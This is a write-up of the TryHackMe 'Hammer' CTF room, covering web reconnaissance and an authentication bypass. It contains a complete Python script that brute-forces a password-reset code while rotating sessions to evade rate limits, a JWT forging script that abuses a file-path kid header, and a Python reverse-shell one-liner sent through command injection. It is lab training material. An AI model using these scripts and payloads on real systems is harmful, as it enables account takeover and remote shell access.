---
title: Hammer CTF Writeup
description: Break auth with the hammer!
tags: tryhackme, web, medium
---

In this writeup, I'll describe in detail how I completed the CTF Challenge ["Hammer" on TryHackMe](https://tryhackme.com/room/hammer). I'll describe what techniques I used, where I struggled, and what pitfalls I fell into, which I'll try to avoid in the future. This is my first writeup, so bear with me!

So now let's get right into it!

## Reconnaissance & Enumeration

First things first, I started with a simple nmap full port scan on the target:

```bash
nmap -p- 10.10.85.193 -T4 | tee nmap_full.txt
```
- **`-p-`**: This defines that we want to scan the **full port range** (1-65535) of the target.
- **`-T4`**: Sets the timing template to "aggressive" to speed things up a bit.
- **`| tee nmap_full.txt`**: This just saves the generated output into a text file, so I can look up the information whenever I want.

![[image.png]]

As you can see in the picture, nmap discovered two open ports:

1. **22 → SSH**: This could be useful in the future if we gain access to credentials, but for now, it's less interesting.
2. **1337 → waste**: This is _a lot_ more interesting for us.

Now, let's continue with a version scan on the open ports to gain more information about the running services. This is always useful information:
```bash
nmap -sS -sV -p 22,1337 -v 10.10.85.193 | tee nmap_version.txt
```
- **`-sS`**: Stealth Scan → This flag tells nmap to do a SYN scan, or "half-open" scan. In this CTF environment, the usability of this method is rather low (we aren't really trying to implement OpSec), but it's good practice.
- **`-sV`**: This flag activates the **Version scan** for the open ports.
- **`-p 22,1337`**: Specifies to _only_ scan the ports we found.
- **`-v`**: Verbose → The output of nmap will have more detail.

This scan gave me the following output:

![[image1.png]]

Interesting, we have an Apache webserver on an Ubuntu machine. Let's continue by visiting the web page. After opening the website on port 1337, I was presented with a login screen:

![[image2.png]]

After clicking on the "Forgot your password" button, I was asked to input an email address. This could maybe be fuzzed or enumerated, but I decided to first look around a bit more before digging deeper into this feature. I wanted to avoid wasting time falling into a rabbit hole and missing other important details. This was a mistake I made a lot of times when I began with CTFs, but not this time!

First, I continued my discovery by checking the tech stack with a tool called **Wappalyzer**. Wappalyzer is a browser extension that gives you insights into the tech stack and frameworks behind a web app. Sadly this time, Wappalyzer only told me that the programming language used is **PHP**. Nevertheless, that's still useful information.

![[image3.png]]
As a next step in my reconnaissance, I decided to do some directory/endpoint enumeration. For that, I used the tool **gobuster**. With the following command, I started to enumerate the web app for hidden directories:

```bash
gobuster dir -u http://10.10.85.193:1337/ -w /usr/share/wordlists/dirb/common.txt
```
![[image5.png]]
Interesting! A couple of open endpoints, especially the `/phpmyadmin` endpoint, since I had in mind that there was a SQL injection for a specific version. I decided to keep this information in mind and continued with the current discovery, because I didn't want to lose my focus and miss any details.

After looking at the page source of the login panel, I found an interesting developer comment:

<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->

That's good to know! With that info, I decided to start another directory enumeration scan, this time with **ffuf**, to search specifically for this custom `hmr_` pattern.

This is the `ffuf` command I used:

```bash
ffuf -u http://10.10.85.193:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/common.txt -t 100 -c
```

And there we go, we found some interesting directories on the webserver:

![[image6.png]]

The `logs` directory looks very promising, since log files (specifically error logs) often contain interesting info about the architecture of an application.

In the `logs` folder, I found a file called `errors.log`! Perfect. I downloaded the file and started to investigate.

```txt
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address 
```

Very nice! The error logs revealed an email to us: **`tester@hammer.thm`**. This is very useful, since now we can (maybe) abuse the password reset feature and bypass the authentication.

## Exploitation: Bypassing the Password Reset

After entering the email, I was presented with a screen asking for a recovery code.

![[image7.png]]

Of course, I don't have access to that email, so we have to find another way around. The first thing I did was fire up **Burp Suite** and check what options we have. It turned out that the timer was client-side and could be reset just by re-sending the email request. Sweet!

Since the code is only 4 digits (0000-9999), I figured I could bruteforce it. I wrote a little Python script exploiting the fact that we can reset the timer.

But it wasn't that easy. After my script made about 8 requests, I got rate-limited.

```shell
rate limit exceeded
```

My first, naive approach was just to increase the timer, which obviously didn't work. So I did some research on how to bypass rate limits. From my reconnaissance, I remembered that the web app uses some kind of PHP session (`PHPSESSID`), and my research showed that **session rotation** is a potential attack vector against rate-limiting. I tried it out, rotating my session cookie after every 7 requests, and it worked!

Here is the final script:

```python
#!/usr/bin/env python3
import requests, time, random

def brute():
    url = "http://10.10.137.59:1337/reset_password.php"
    email = "tester@hammer.thm"
    s_val = "1000"
    delay = 0.05          # nominal delay between attempts
    rotate_every = 7      # get a new session every N attempts
    fail_phrase = "Invalid or expired recovery code!"
    max_backoff = 60      # seconds

    def new_session():
        s = requests.Session()
        s.headers.update({"User-Agent": "bruteforce-script/1.0"})
        return s

    sess = new_session()
    attempts_since_rotate = 0
    backoff_exp = 0

    def trigger_email(sess):
        """POST email to (re)start/reset the recovery flow and obtain PHPSESSID."""
        try:
            r = sess.post(url, data={"email": email}, timeout=10, allow_redirects=True)
            return r
        except Exception as e:
            print("[!] trigger email failed:", e)
            return None

    # initial trigger to get PHPSESSID
    print("[*] initial POST to trigger/reset flow and obtain PHPSESSID...")
    r = trigger_email(sess)
    phpsess = sess.cookies.get("PHPSESSID")
    print("[*] PHPSESSID =", phpsess)

    for n in range(0, 10000):
        code = f"{n:04d}"

        # rotate session periodically (attempt to avoid per-session rate limits)
        if attempts_since_rotate >= rotate_every:
            print("[*] rotating session to get fresh PHPSESSID...")
            sess = new_session()
            r = trigger_email(sess)
            phpsess = sess.cookies.get("PHPSESSID")
            print("[*] new PHPSESSID =", phpsess)
            attempts_since_rotate = 0
            backoff_exp = 0

        try:
            r = sess.post(url,
                          data={"recovery_code": code, "s": s_val},
                          timeout=10,
                          allow_redirects=True)
        except Exception as e:
            print(f"[!] request error for {code}: {e} -- sleeping briefly and retrying")
            time.sleep(1)
            continue

        text = r.text.lower() if r.text else ""
        status = r.status_code

        if fail_phrase.lower() in text:
            attempts_since_rotate += 1
            if n % 500 == 0:
                print(f"[-] tried {code}...")
            continue
        else:
            # found
            print(">>> FOUND CODE <<<")
            print("code =", code)
            try:
                with open("found_code.txt", "w") as f:
                    f.write(code + "\n")
                print("[*] saved to found_code.txt")
            except Exception as e:
                print("[!] failed to save:", e)
            snippet = r.text[:1000].replace("\n", "\\n")
            print("[*] response snippet (first 1000 chars):")
            print(snippet)
            return

    print("[*] finished: no code found (all attempts returned fail phrase)")

if __name__ == "__main__":
    brute()
```

### Script Explanation

This script kicks off by sending an initial POST request to `reset_password.php` with the email. This (re)starts the recovery process and, most importantly, gets us our first `PHPSESSID` cookie.

Then, it loops from `0000` to `9999`, testing each code. To bypass the rate limit, it rotates the session. The `rotate_every = 7` variable means that after 7 attempts (when `attempts_since_rotate` hits 7), it calls the `trigger_email` function again. This gets a **brand new `PHPSESSID`** and resets the rate limit counter on the server's end.

It checks every response for the `fail_phrase` ("Invalid or expired recovery code!"). If that phrase is _missing_, it assumes we've found the correct code, prints it, and saves it to `found_code.txt`.

After the script found the code, I just had to copy the _last used_ `PHPSESSID` from my script's output, replace the session cookie in my browser with it, and refresh the page. Voila! We have a reset form:

![[image8.png]]

After logging in with my new credentials, I was presented with this screen and the first flag:

![[image9.png]]

## Privilege Escalation: Command Injection & JWT Forging

This screen immediately told me two things:

1. The user's name is potentially **Thor**.
2. We might have a **command injection** vulnerability, since we have a form to enter commands.

I tried a simple `ls` command to check if we could run commands for sure, and it worked:

![[image10.png]]

Every other command I tried (`whoami`, `cat`, etc.) returned a message that I didn't have the right permissions.

After 10 seconds or so, I got logged out, which was really annoying. I started to check the website source code to see what was causing this. I found a JavaScript snippet that looked very weird, with no particular purpose:

![[image11.png]]

This function just checks if a cookie named `persistentSession` is set, and if not, redirects the user to `logout.php`. So I just set that cookie manually in my browser's developer tools and continued my inspection of the code responsible for sending the command to the server:
```javascript
<script>
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzU5NDI1NjI5LCJleHAiOjE3NTk0MjkyMjksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.43kiLOogNB0tfKU0mdXVs7mHovytcMuIF4si1RTyCVQ';

        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({ command: command }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
</script>
```

This script extracts the command and sends it with an AJAX call to the server. What's _really_ interesting here is the **hardcoded JWT token**. Generally, hardcoding JWTs like this is a very bad practice.

### A Quick Detour on JWTs

A **JWT (JSON Web Token)** is a compact, URL-safe way of representing claims between two parties. It's a _sessionless_ authentication method, meaning the server doesn't need to store your session state. It consists of three parts separated by dots (`.`):

1. **Header**: Contains metadata, like the token type (`typ`) and the signing algorithm (`alg`).
2. **Payload**: Contains the "claims" or data, like the user's ID, email, and (in our case) **role**.
3. **Signature**: This is used to verify that the token wasn't tampered with. It's created by signing the header and payload with a secret key known _only_ to the server.

So, let's investigate this token. I copied it over to **jwt.io**, which is a great tool for decoding and debugging JWTs.

This is the decoded **Header**:

```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
```

The `kid` (Key ID) field is _very_ interesting. It's highly unusual and looks like a file path: `/var/www/mykey.key`. This suggests a major vulnerability: what if the server uses this `kid` path to _dynamically load the key for verification_? If so, we could potentially control _which_ key it uses.

This is the decoded **Payload**:

```json
{
  "iss": "http://hammer.thm",
  "aud": "http://hammer.thm",
  "iat": 1759425629,
  "exp": 1759429229,
  "data": {
    "user_id": 1,
    "email": "tester@hammer.thm",
    "role": "user"
  }
}
```

The `role` field is the other key piece. We are currently just a **"user"**, which explains our limited permissions.

### The Attack Plan

Looking back at our `ls` output from earlier, we see a file named **`188ade1.key`**! This is probably a private key sitting right in the web root.

So, here's the plan:

1. Download the `188ade1.key` file from the webserver. (I did this with `wget http://10.10.85.193:1337/188ade1.key`).
2. `cat` the file to get its content (the secret key string).
3. Forge a _new_ JWT.
4. In the payload, change `"role": "user"` to **`"role": "admin"`**.
5. In the header, change the `"kid"` (Key ID) to point to the key we just found: **`"/var/www/html/188ade1.key"`**. (Assuming the web root is `/var/www/html`).
6. Sign this new token using the secret _from_ the `188ade1.key` file.

If this works, the server will read our malicious `kid` header, fetch the key from `/var/www/html/188ade1.key` to _verify_ the signature, and see that it's valid (since we used that _same key_ to _create_ the signature). Then it will trust our payload, see `"role": "admin"`, and give us escalated privileges!

Here is the quick Python script I used to forge our evil JWT:

```python
#!/usr/bin/env python3
import jwt, time

# This is the secret I got from cat-ing the 188ade1.key file
SECRET_HEX = "56058354efb3daa97ebab00fabd7a7d7"
KID_PATH = "/var/www/html/188ade1.key"

payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
    "data": {"user_id": 1, "email": "tester@hammer.thm", "role": "admin"}
}
headers = {"kid": KID_PATH}

token = jwt.encode(payload, SECRET_HEX, algorithm="HS256", headers=headers)
print(token)
```

### Script Explanation

This script uses the `pyjwt` library.

- **`SECRET_HEX`**: This is the _actual content_ I got from `cat`-ing the `188ade1.key` file I downloaded.
- **`KID_PATH`**: This is our malicious path, pointing to the key on the server.
- **`payload`**: I recreated the payload, setting `iat` (issued at) to the current time, `exp` (expires) to an hour from now, and most importantly, **`"role": "admin"`**.
- **`headers`**: This is where we inject our malicious `kid` path.
- **`jwt.encode(...)`**: This function builds and signs the token, giving us the final string to print.

Now the only thing left to do was to intercept the request (that sends the `ls` command) with Burp, replace the hardcoded JWT in the `Authorization: Bearer` header with our new forged one, and... it worked!

![[image12.png]]

I ran `whoami` and other commands, and they all worked. We are `www-data`, but with admin rights in the app.

## Getting the Shell

Now we could just `cat` the `flag.txt` and call it a day, but I wanted to get a shell on the target machine.

So I first checked if Python was installed with our new privileges (running `python -h`). Luckily, it was!

On my attacker machine, I set up a `netcat` listener:

```bash
nc -nlvp 4444
```

For the reverse shell, I used a classic Python one-liner from Pentest Monkey. This is the final JSON payload I sent in Burp (replacing the `ls` command):

```json
{"command":"python3 -c \"import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('MY_IP',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])\""}
```

After sending the request... tada, we got a shell!

![[image13.png]]

From here, I could grab the final flag. Thanks for reading!
